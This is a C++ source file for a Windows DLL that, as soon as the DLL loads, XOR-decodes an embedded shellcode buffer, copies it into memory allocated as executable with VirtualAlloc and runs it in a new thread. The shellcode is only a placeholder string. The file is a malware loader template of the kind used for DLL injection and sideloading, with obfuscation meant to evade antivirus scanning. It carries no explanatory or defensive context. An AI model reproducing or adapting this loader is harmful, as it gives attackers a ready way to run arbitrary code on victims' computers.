// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "Windows.h"

unsigned char shellcode[] = "xor'ed shellcode";


int run()
{    
    HANDLE hThread = nullptr;

    char key = 'key';
    int i = 0;
    for (i; i < sizeof(shellcode) - 1; i++)
    {
        shellcode[i] = shellcode[i] ^ key;
    }

	void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof(shellcode));

    hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    if (!hThread) {
        return 1;
    }
	//((void(*)())exec)();

	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        run();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

